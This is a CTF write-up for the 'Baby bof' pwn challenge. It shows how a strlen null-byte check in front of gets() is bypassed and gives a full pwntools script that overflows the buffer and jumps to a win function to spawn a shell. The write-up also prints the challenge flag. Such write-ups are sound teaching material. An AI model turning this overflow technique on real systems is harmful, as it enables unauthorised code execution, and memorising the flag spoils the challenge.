---
ctf: UofTCTF 2026
category: pwn
difficulty: easy
points: 47
flag: uoftctf{i7s_n0_surpris3_7h47_s7rl3n_s70ps_47_null}
techniques:
  - buffer-overflow
  - strlen-bypass
  - stack-alignment
tools:
  - pwntools
  - gdb
---

# Baby bof

## Description

People said `gets` is not safe, but I think I figured out how to make it safe.

**Connection:** `nc 34.48.173.44 5000`

## Vulnerability

The binary is a simple x86-64 executable with the following protections:
- No PIE (fixed addresses)
- No stack canary
- NX enabled

Analyzing the binary reveals a `win` function at `0x4011f6` that calls `system("/bin/sh")`.

The `main` function reads user input using the vulnerable `gets()` function into a 16-byte buffer, but attempts to "secure" it by checking if `strlen()` returns more than 14.

**The vulnerability:** `strlen()` stops counting at the first null byte (`\x00`), while `gets()` continues reading until a newline character. This allows us to bypass the length check by placing a null byte at the start of our payload.

## Solution

### Stack Layout Analysis

- Buffer at `rbp-0x10` (16 bytes)
- Saved RBP at `rbp` (8 bytes)
- Return address at `rbp+0x8`
- **Total offset to return address: 24 bytes**

### Exploit Strategy

1. Start payload with null byte (`\x00`) to make `strlen()` return 0
2. Pad with 23 bytes to reach return address
3. Add a `ret` gadget (`0x40101a`) for stack alignment
4. Add the address of `win` function (`0x4011f6`)

### Exploit Code

```python
from pwn import *

# Connect to remote
p = remote('34.48.173.44', 5000)

# Addresses
WIN = 0x4011f6
RET = 0x40101a  # ret gadget for stack alignment

# Payload: null byte + padding + ret + win
payload = b'\x00' + b'A' * 23 + p64(RET) + p64(WIN)

# Send and get shell
p.sendline(payload)
p.interactive()
```

## Key Techniques

- `strlen()` null-byte bypass
- Classic stack buffer overflow
- Stack alignment with `ret` gadget
- Direct return to win function

